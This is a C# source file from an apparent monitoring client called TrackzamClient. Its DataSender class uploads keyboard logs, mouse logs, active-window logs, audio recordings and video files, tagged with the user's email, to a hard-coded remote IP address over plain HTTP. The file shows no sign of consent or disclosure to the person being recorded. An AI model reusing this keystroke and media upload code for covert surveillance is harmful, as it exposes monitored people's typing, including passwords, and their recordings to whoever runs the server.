using System;
using System.IO;
using System.IO.Compression;
using System.Net;
using System.Net.Http;
using System.Threading;
using System.Threading.Tasks;
using RestSharp;

namespace TrackzamClient
{
    public class DataSender
    {
        /// <summary>
        /// Sets IP address
        /// </summary>
        /// <param name="ipAddress"> ip address string </param>
        public static void SetIPAdress(string ipAddress)
        {
            _ipAddress = ipAddress;
        }
        
        /// <summary>
        /// Sends audio logs
        /// </summary>
        /// <param name="path"> audio log file path </param>
        public static void SendAudioLogs(string path)
        {
            SendFileAsync("send_audio_logs", path);
        }
        
        /// <summary>
        /// Sends audio file
        /// </summary>
        /// <param name="path"> audio file path </param>
        public static void SendAudioFile(string path)
        {
            SendFileAsync("send_audio_file", path, "8080");
        }
        
        /// <summary>
        /// Sends video file
        /// </summary>
        /// <param name="path"> video file path </param>
        public static void SendVideoFile(string path, string startTime)
        {
            SendFileAsync("send_video_file", path, "8080", "&start_time="+startTime);
        }
        
        /// <summary>
        /// Sends keyboard log file
        /// </summary>
        /// <param name="path"> keyboard log file path </param>
        public static void SendKeyboardLogs(string path)
        {
            SendFileAsync("send_keyboard_logs", path);
        }
        
        /// <summary>
        /// Sends mouse log file
        /// </summary>
        /// <param name="path"> mouse log file path </param>
        public static void SendMouseLogs(string path)
        {
            SendFileAsync("send_mouse_logs", path);
        }
        
        /// <summary>
        /// Sends active window log file
        /// </summary>
        /// <param name="path"> active window log file path </param>
        public static void SendWindowLogs(string path)
        {
            SendFileAsync("send_window_logs", path);
        }
        
        private static async void SendFileAsync(string type, string path, string port = "8000", string additionalKeys = "")
        {
            await Task.Run(() =>
            {
                HttpWebRequest requestToServerEndpoint =
                    (HttpWebRequest) WebRequest.Create("http://" + _ipAddress + ":" + port + "/api/" + type +
                                                       "?email=" + InfoSaver.GetEmail() + additionalKeys);

                string boundaryString = "----SomeRandomText";
                string fileUrl = path;

                requestToServerEndpoint.Method = WebRequestMethods.Http.Post;
                requestToServerEndpoint.ContentType = "multipart/form-data; boundary=" + boundaryString;
                requestToServerEndpoint.KeepAlive = true;
                requestToServerEndpoint.Credentials = System.Net.CredentialCache.DefaultCredentials;

                MemoryStream postDataStream = new MemoryStream();
                StreamWriter postDataWriter = new StreamWriter(postDataStream);

                postDataWriter.Write("\r\n--" + boundaryString + "\r\n");
                postDataWriter.Write("Content-Disposition: form-data;"
                                     + "name=\"{0}\";"
                                     + "filename=\"{1}\""
                                     + "\r\nContent-Type: {2}\r\n\r\n",
                    "file",
                    Path.GetFileName(fileUrl),
                    Path.GetExtension(fileUrl));
                postDataWriter.Flush();

                FileStream fileStream = new FileStream(fileUrl, FileMode.Open, FileAccess.Read);
                byte[] buffer = new byte[1024];
                int bytesRead = 0;
                while ((bytesRead = fileStream.Read(buffer, 0, buffer.Length)) != 0)
                {
                    postDataStream.Write(buffer, 0, bytesRead);
                }

                fileStream.Close();

                postDataWriter.Write("\r\n--" + boundaryString + "--\r\n");
                postDataWriter.Flush();

                requestToServerEndpoint.ContentLength = postDataStream.Length;

                using (Stream s = requestToServerEndpoint.GetRequestStream())
                {
                    postDataStream.WriteTo(s);
                }

                Console.WriteLine(requestToServerEndpoint.GetResponse().Headers);

                while (!requestToServerEndpoint.HaveResponse)
                {
                    Thread.Sleep(1000);
                }

                postDataStream.Close();
            });
        }

        private static string _ipAddress = "34.71.243.7";
    }
}